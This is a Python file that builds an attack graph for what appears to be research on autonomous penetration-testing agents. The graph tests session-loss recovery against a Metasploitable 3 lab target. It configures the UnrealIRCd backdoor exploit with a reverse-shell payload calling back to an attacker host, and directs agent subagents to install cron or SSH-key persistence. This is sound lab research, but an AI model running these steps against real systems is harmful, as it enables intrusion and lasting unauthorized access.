"""
Example Attack Graph: ORPHAN-B — capability loss before PERSISTENCE (MS3).

Second placement of the SAME capability-loss injection as orphan-C, moved one
stage EARLIER in the kill chain: the session obtained at initial access is
destroyed externally BEFORE the PERSISTENCE step runs (orphan-C kills before the
terminal impact step). This exercises C1's generality claim — the graft repairs
the *capability-loss class*, not one fixed spot in the chain — and it is a
STRONGER test than orphan-C because the orphaned objective is NOT terminal:
the graft must re-provision a session and re-parent a TWO-NODE subgraph
(persist -> file_drop) onto the fresh session, so the re-parent has to carry
through a downstream node, not just a single leaf.

Chain: recon -> gain_access (opens a session) -> persist (persistence objective)
       -> file_drop (impact proof).
Injection: the harness destroys the session obtained at gain_access BEFORE the
persist node runs, so persist's precondition (a live session) is unsatisfiable
at every retry budget -> repair must be structural (graft), not a retry.

GROUNDING — why there is still a terminal impact node:
  persistence grounding in parse_eval is FINDINGS-derived (self-report): there is
  no cheap INDEPENDENT probe of a landed cron/ssh-key/service the way `id` probes
  root or a marker read-back probes impact (documented C5 limitation in
  experiments/parse_eval.py). So we do NOT let a persistence self-claim be the
  recovered objective. The DEEPEST objective node is file_drop (impact), which
  grounds DETERMINISTICALLY on a proof-marker read-back captured off the target
  (parse_eval._impact_grounded). Recovery for orphan-B is therefore measured on an
  INDEPENDENTLY-grounded objective, exactly like orphan-C — the persistence node is
  the placement of the capability loss, not the thing we ground on.

Both persist and file_drop are GOAL-ONLY (no prescribed commands/module) so they
dispatch to their subagents, whose live-session resolvers run on the FRESH grafted
session (not the dead original).

Run with explore=True so the graft is active.

LIVE NOTE: confirm the graft re-parents the whole persist->file_drop subgraph onto
the re-exploit node (orphan-C only ever re-parented a single terminal leaf). If the
re-parent stops at persist and leaves file_drop dangling, that is the one new thing
orphan-B exercises over orphan-C — check it on the first live cell.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)

KILL_BEFORE_NODE = "persist"           # session is killed right before this runs
CAPABILITY_PROVIDER = "gain_access"    # the node that opened the session (kappa in H)
PROOF_MARKER = "PWNED_ORPHAN_B_e5c1"   # stable literal to write then read back
PROOF_FILE = "/tmp/pwned_orphan_b.txt"


def build_orphan_b_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via the UnrealIRCd "
                  "3.2.8.1 backdoor on port 6667, establish a reliable persistence "
                  "mechanism, then drop a verified proof-of-compromise file. (This is "
                  "the orphan-B capability-loss scenario: the session obtained at "
                  "initial access is destroyed externally before the persistence step "
                  "runs, so the objective can only be reached by re-provisioning a "
                  "fresh session and re-parenting the persistence + impact steps onto "
                  "it.)",
        target_ip=target_ip,
        name=f"orphan_b_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Capability-loss (orphan) scenario at the PERSISTENCE placement: "
                    "the access session is killed externally before persistence — a "
                    "second, earlier placement of the graft, with a downstream impact "
                    "node so the recovered objective grounds independently.",
        metadata={
            "scenario": "orphan_b",
            "target_type": "metasploitable3",
            "injection": {
                "type": "capability_loss",
                "capability": "session",
                "kill_before_node": KILL_BEFORE_NODE,
                "provided_by_node": CAPABILITY_PROVIDER,
                "stage": "persistence",
            },
        },
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Discover Attack Surface",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's open services and versions",
        objective=f"Discover open ports, services and versions on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -Pn -sV --top-ports 1000 -T4 {target_ip}"],
        max_retries=2,
        tags=["recon"],
    ))

    # WORKING proven lander: UnrealIRCd 3.2.8.1 backdoor on 6667 -> command shell.
    # Establishes the session capability that the harness later destroys.
    graph.add_node(AttackNode(
        id="gain_access",
        label="Gain Initial Access (UnrealIRCd backdoor)",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Open a command shell session on the target",
        objective=f"Gain an initial command shell on {target_ip} via the "
                  f"UnrealIRCd 3.2.8.1 backdoor on port 6667. LHOST={attacker_ip}.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/unix/irc/unreal_ircd_3281_backdoor",
        module_options={"RHOSTS": target_ip, "RPORT": 6667},
        payload="cmd/unix/reverse_perl",
        payload_options={"LHOST": attacker_ip, "LPORT": 4465},
        max_retries=3,
        tags=["initial_access", "unrealircd", "backdoor"],
    ))

    # THE ORPHANED NODE: a persistence objective. GOAL-ONLY (no commands_to_run / no
    # module) so it dispatches to the persistence subagent, whose live-session
    # resolver runs on the FRESH grafted session. The harness kills the session right
    # before this node -> its precondition (a live session) is orphaned -> graft.
    graph.add_node(AttackNode(
        id="persist",
        label="Establish Persistence (goal-only)",
        tactic=Tactic.PERSISTENCE.value,
        technique_id="T1053.003",
        technique_name="Scheduled Task/Job: Cron",
        agent_type="persistence",
        goal="Install a persistence mechanism via the session",
        objective="Establish a reliable persistence mechanism on the target via the "
                  "session (e.g. a cron job, an SSH authorized_keys entry, or an "
                  "init/service hook) and verify it is in place.",
        target_ip=target_ip,
        tool_name="session",
        max_retries=3,
        tags=["persistence", "objective"],
    ))

    # THE GROUNDED OBJECTIVE: a deterministic impact, DOWNSTREAM of persist. GOAL-ONLY
    # so it dispatches to the impact subagent, which resolves the fresh session and
    # writes+reads-back the proof marker. This is the node parse_eval grounds on
    # (impact read-back is INDEPENDENT; persistence grounding is self-report, C5).
    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written, verified artifact",
        objective=(f"Write the exact marker '{PROOF_MARKER}' to {PROOF_FILE} on the "
                   f"target via the session, then read {PROOF_FILE} back to verify the "
                   f"write succeeded. The marker must appear in the read-back output."),
        target_ip=target_ip,
        tool_name="session",
        max_retries=3,
        metadata={"target_file": PROOF_FILE, "marker": PROOF_MARKER},
        tags=["impact", "file_drop", "proof", "objective"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "gain_access",
        checks=[EdgeCheck(field="success", operator="equals", expected="True",
                          description="Recon produced usable service data")],
        evidence="Recon mapped the attack surface",
        rationale="Attempt initial access via the UnrealIRCd backdoor",
    )
    # Carries the SESSION capability from gain_access to persist. When the harness
    # destroys the session, persist's precondition is no longer held -> orphaning.
    graph.connect(
        "gain_access", "persist",
        checks=[EdgeCheck(field="session_id", operator="exists",
                          description="A live session is required to persist")],
        evidence="Initial session established",
        rationale="Establish persistence over the session",
    )
    # The session must still be usable for the downstream impact proof.
    graph.connect(
        "persist", "file_drop",
        checks=[EdgeCheck(field="session_id", operator="exists",
                          description="Session is still usable for the impact proof")],
        evidence="Persistence established",
        rationale="Drop the proof-of-compromise file over the session",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_orphan_b_graph(target_ip="192.168.34.7", attacker_ip="192.168.34.6")
    print(graph.summary())
    print()
    out_path = "examples/orphan_b_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")
    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
